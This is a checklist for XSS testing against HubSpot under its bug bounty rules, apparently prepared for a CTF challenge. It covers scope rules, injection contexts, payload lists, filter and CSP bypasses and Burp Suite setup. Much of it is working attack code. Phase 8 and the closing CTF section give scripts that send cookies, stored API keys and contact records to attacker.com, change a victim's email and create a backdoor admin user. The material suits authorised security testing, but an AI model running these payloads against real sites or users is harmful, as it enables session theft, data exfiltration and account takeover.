# XSS (Cross-Site Scripting) Testing Checklist

## HubSpot XSS Rules (CRITICAL TO UNDERSTAND)

### ✅ REWARDABLE XSS
1. **XSS that executes in `*.hubspot.com` context** while authenticated
2. **XSS on customer connected domains** that:
   - Also executes on the connected domain
   - Was introduced by HubSpot (not customer code)
3. **XSS with clear security impact** to HubSpot platform

### ❌ NOT REWARDABLE XSS
1. **Preview domains**: `hs-sites.com`, `hubspotpagebuilder.com`, `hubspotpreview.com`, `cdn.hubspot.net`
   - These intentionally host untrusted user data
2. **Customer-introduced XSS**: Vulnerable HubL or JavaScript written by customer
3. **Default system domains** unless criteria above are met

## Testing Strategy

### Phase 1: Target Identification

#### In-Scope Areas for XSS
- [ ] `app*.hubspot.com` - Main application (CRITICAL)
- [ ] `api*.hubspot.com` - API responses
- [ ] Customer connected domains (when HubSpot-introduced)
- [ ] `chatspot.ai` - AI chat interface
- [ ] Mobile app WebViews
- [ ] Email templates (if reflected in hubspot.com)

#### XSS Entry Points
- [ ] Contact/Company/Deal form fields
- [ ] Custom properties
- [ ] Email templates
- [ ] Landing pages (CMS)
- [ ] Blog posts
- [ ] Workflow configurations
- [ ] Ticket descriptions
- [ ] Notes and comments
- [ ] Search queries
- [ ] URL parameters
- [ ] API responses
- [ ] File upload filenames
- [ ] User profile fields

### Phase 2: Context Analysis

#### Identify Injection Contexts
For each entry point, determine where input is reflected:

**HTML Context:**
```html
<div>USER_INPUT</div>
<input value="USER_INPUT">
<a href="USER_INPUT">
```

**JavaScript Context:**
```javascript
var data = "USER_INPUT";
callback('USER_INPUT');
```

**Attribute Context:**
```html
<div class="USER_INPUT">
<img src="USER_INPUT">
```

**URL Context:**
```html
<a href="javascript:USER_INPUT">
<iframe src="USER_INPUT">
```

#### Determine Security Controls
- [ ] What encoding is applied? (HTML entity, JavaScript escape, URL encode)
- [ ] Is there a Content Security Policy (CSP)?
- [ ] Are there input validation filters?
- [ ] What sanitization library is used?
- [ ] Are there length limits?

**Burp Actions:**
- Check response headers for CSP
- Test with simple payloads: `<script>alert(1)</script>`
- Observe how input is encoded/filtered

### Phase 3: Basic XSS Testing

#### Standard Payloads by Context

**HTML Context:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Attribute Breaking:**
```html
"><script>alert(1)</script>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

**JavaScript Context:**
```javascript
';alert(1);//
'-alert(1)-'
`-alert(1)-`
</script><script>alert(1)</script>
```

**Burp Intruder Setup:**
- Position: Input fields
- Payload list: XSS polyglots
- Grep: Search responses for unencoded payload

### Phase 4: Filter Bypass Techniques

#### Common Filters to Bypass

**Blocked Keywords:**
```javascript
// If "script" is blocked:
<scr<script>ipt>alert(1)</scr<script>ipt>
<ſcript>alert(1)</ſcript>  // Unicode
<ScRiPt>alert(1)</sCrIpT>  // Case variation

// If "alert" is blocked:
(alert)(1)
window['ale'+'rt'](1)
eval('ale'+'rt(1)')
top['ale'+'rt'](1)
```

**HTML Encoding Bypass:**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
```

**URL Encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E  // Double encoding
```

**Unicode/UTF-7:**
```javascript
<script>alert\u0028document.domain\u0029</script>
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### CSP Bypass Techniques

**If CSP allows 'unsafe-inline':**
```html
<script>alert(1)</script>  // Should work
```

**If CSP allows external scripts:**
```html
<script src="https://attacker.com/xss.js"></script>
```

**CSP with base-uri not set:**
```html
<base href="https://attacker.com/">
<script src="/xss.js"></script>  // Loads from attacker.com
```

**Bypass via allowed domains:**
```html
<!-- If 'www.google.com' is whitelisted -->
<script src="https://www.google.com/jsapi?callback=alert"></script>
```

**JSONP endpoints:**
```html
<script src="https://trusted.hubspot.com/api/data?callback=alert"></script>
```

### Phase 5: Stored XSS Testing

#### High-Impact Stored XSS Locations

**Contact/CRM Records:**
- [ ] Contact firstname, lastname, email fields
- [ ] Company name, domain fields
- [ ] Deal name, description fields
- [ ] Custom property values
- [ ] Notes and comments

**Test Process:**
1. Create contact with XSS payload in name
2. View contact in different contexts:
   - Contact detail page
   - Contact list view
   - Search results
   - Email preview
   - Reports/dashboards
3. Share contact with other users
4. Export and reimport

**Content Areas:**
- [ ] Blog post content
- [ ] Landing page HTML
- [ ] Email template code
- [ ] Workflow names/descriptions
- [ ] Form field labels
- [ ] Lists and segments

**Burp Actions:**
- Intercept POST requests creating/updating objects
- Inject XSS payloads
- Browse to different views to trigger
- Check if payload executes in `*.hubspot.com`

### Phase 6: Reflected XSS Testing

#### URL Parameter Testing
```
https://app.hubspot.com/search?q=<script>alert(1)</script>
https://app.hubspot.com/contacts/view?id=123&name=<img src=x onerror=alert(1)>
https://api.hubspot.com/error?msg=<svg onload=alert(1)>
```

**Burp Actions:**
- Spider/crawl app to find parameters
- Use Intruder on all parameters
- Check error pages for reflected input

#### HTTP Header Injection
```
User-Agent: <script>alert(1)</script>
Referer: https://attacker.com/"><script>alert(1)</script>
X-Forwarded-For: <img src=x onerror=alert(1)>
```

#### API Endpoint Testing
```
POST /api/v1/contacts
{
  "firstname": "<script>alert(1)</script>",
  "email": "test@test.com"
}

Check if reflected in:
- API response
- Subsequent GET requests
- Admin dashboard
- Email notifications
```

### Phase 7: DOM-Based XSS

#### DOM Sinks to Test
- [ ] `innerHTML`
- [ ] `outerHTML`
- [ ] `document.write`
- [ ] `eval()`
- [ ] `setTimeout()` / `setInterval()`
- [ ] `location` / `location.href`
- [ ] `window.open()`

**Test Approach:**
1. Find JavaScript that reads from URL/user input
2. Trace where that data flows
3. Check if it reaches a dangerous sink without sanitization

**Example:**
```javascript
// Vulnerable code:
var search = location.hash.substring(1);
document.getElementById('results').innerHTML = search;

// Exploit:
https://app.hubspot.com/page#<img src=x onerror=alert(1)>
```

**Burp Extensions:**
- DOM Invader (built into Burp Suite)
- Use to identify DOM XSS automatically

### Phase 8: XSS to Account Takeover

#### High-Impact XSS Exploits

**Steal Session Tokens:**
```javascript
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>
```

**Steal API Keys:**
```javascript
<script>
// Look for API keys in page source or localStorage
fetch('https://attacker.com/steal?key='+localStorage.getItem('api_key'));
</script>
```

**Perform Actions as Victim:**
```javascript
<script>
// Change victim's email
fetch('/api/account/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@example.com'})
});
</script>
```

**Access Sensitive Data:**
```javascript
<script>
// For CTF: Try to read contact data
fetch('/api/contacts/46962361/all')
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/exfil?data='+JSON.stringify(data));
  });
</script>
```

**Create Backdoor User:**
```javascript
<script>
fetch('/api/users/invite', {
  method: 'POST',
  body: JSON.stringify({
    email: 'attacker@example.com',
    role: 'admin'
  })
});
</script>
```

### Phase 9: Customer Connected Domain XSS

#### Testing Process
1. Set up customer portal with connected domain
2. Create content with XSS payload
3. Verify it executes on connected domain
4. Prove it was introduced by HubSpot (not your custom code)

**Documentation Required:**
- Proof connected domain is using HubSpot hosting
- Proof XSS exists on both connected domain AND hubspot.com
- Proof vulnerability is in HubSpot platform code
- Clear security impact

### Phase 10: XSS in Special Features

#### Email Template XSS
- [ ] Test email template editor
- [ ] Check if XSS in template fires when email viewed in HubSpot
- [ ] Test personalization tokens: `{{contact.firstname}}`
- [ ] Test HubL injection leading to XSS

#### Workflow XSS
- [ ] Workflow names and descriptions
- [ ] Custom code actions
- [ ] Email content in workflows
- [ ] Webhook payloads

#### Chat/ChatSpot XSS
- [ ] ChatSpot AI responses
- [ ] Chat widget customization
- [ ] Chat transcripts
- [ ] Automated chat responses

## Burp Suite Configuration

### XSS Scanner Settings
1. Enable Burp Scanner (Pro only)
2. Configure scan settings:
   - Check "Cross-site scripting (reflected)"
   - Check "Cross-site scripting (stored)"
3. Add custom insertion points
4. Add custom XSS payloads

### Intruder Payloads

**XSS Payload List:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'-alert(1)-'
<scr<script>ipt>alert(1)</scr</script>ipt>
<ſcript>alert(1)</ſcript>
<img src=x onerror="&#97;lert(1)">
<body onload=alert(1)>
<marquee onstart=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Polyglot Payloads:**
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

### Match & Replace for XSS Testing

Add rules to automatically inject XSS probes:
```
Type: Request body
Match: "firstname":"([^"]*)"
Replace: "firstname":"$1<script>alert(1)</script>"
Action: Auto-inject XSS in firstname field
```

### Useful Extensions
- **DOM Invader**: Detect DOM XSS
- **XSS Validator**: Validate XSS findings
- **Collaborator**: Out-of-band XSS detection
- **Hackvertor**: Encoding/decoding for filter bypass

## XSS Testing Workflow

### 1. Map Input Points
- [ ] Browse entire application
- [ ] Document all input fields
- [ ] Note where input is reflected
- [ ] Identify encoding/filtering

### 2. Context Analysis
- [ ] Determine reflection context (HTML, JS, attribute)
- [ ] Check for CSP and other protections
- [ ] Identify sanitization functions

### 3. Test Basic Payloads
- [ ] Try simple `<script>alert(1)</script>`
- [ ] Test context-specific payloads
- [ ] Document what gets filtered

### 4. Bypass Filters
- [ ] Use encoding techniques
- [ ] Try filter bypass payloads
- [ ] Test case variations
- [ ] Use obfuscation

### 5. Prove Impact
- [ ] Show XSS executes in `*.hubspot.com`
- [ ] Demonstrate account takeover
- [ ] Show data exfiltration
- [ ] Prove security impact

### 6. Document Finding
- [ ] Include full request/response
- [ ] Show payload execution
- [ ] Explain impact clearly
- [ ] Provide fix recommendations

## Red Flags to Investigate

High likelihood of XSS if you see:
- Input reflected without encoding
- Weak CSP or no CSP
- Client-side sanitization only
- Blacklist-based filtering
- Input in dangerous DOM sinks
- User content in JavaScript context
- Legacy code sections
- Custom templating without escaping
- Input in `eval()` or `setTimeout()`

## Documentation Template

```markdown
## XSS Vulnerability: [Type] in [Location]

**Severity**: [Critical/High/Medium]
**Type**: [Stored/Reflected/DOM-based]
**Context**: [*.hubspot.com / Customer Domain]
**CVSS**: [Score]

### Vulnerable Endpoint
`[METHOD] [URL]`

### Description
[Explain the XSS vulnerability]

### Execution Context
- Domain: [*.hubspot.com or connected domain]
- Authentication: [Required/Not required]
- User interaction: [Required/Not required]

### Impact
Successful exploitation allows an attacker to:
- [ ] Steal session tokens
- [ ] Perform actions as victim
- [ ] Access sensitive data
- [ ] Achieve account takeover
- [ ] [Other impacts]

### Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Payload fires and executes alert(1)]

### Proof of Concept

**Payload:**
```html
<script>alert(document.domain)</script>
```

**Request:**
```http
POST /api/contacts/create HTTP/2
Host: api.hubspot.com
Content-Type: application/json

{
  "firstname": "<script>alert(1)</script>"
}
```

**Response/Execution:**
[Screenshot showing alert executing in *.hubspot.com]

### Security Impact Demonstration
[Show how this leads to account takeover or data theft]

### Root Cause
[Why does this happen - insufficient encoding/sanitization]

### Recommended Fix
1. Implement context-aware output encoding
2. Use Content Security Policy
3. Validate input on server-side
4. [Additional recommendations]

### References
- CWE-79: Cross-site Scripting
- [OWASP XSS Guide]
```

## Testing Tips

1. **Focus on Impact**: Show how XSS leads to account takeover or data theft
2. **Verify Domain**: Ensure payload executes in `*.hubspot.com`
3. **Document Everything**: Full requests, responses, screenshots
4. **Think Creatively**: Try unusual inputs and contexts
5. **Check All Features**: Don't just test obvious form fields
6. **Test Customer Domains**: But prove it's HubSpot-introduced
7. **Bypass Filters**: Don't give up after first attempt
8. **Chain Vulnerabilities**: Combine XSS with other bugs for higher impact

## CTF Relevance

For the CTF challenge, XSS could potentially help if:
- XSS on `app.hubspot.com` can access API endpoints
- XSS can read contact data from portal 46962361
- XSS bypasses same-origin policy somehow

**Exploitation idea:**
```javascript
<script>
// If XSS in app.hubspot.com context:
fetch('/api/contacts/46962361/search')
  .then(r => r.json())
  .then(contacts => {
    // Extract firstname and super_secret
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(contacts)
    });
  });
</script>
```
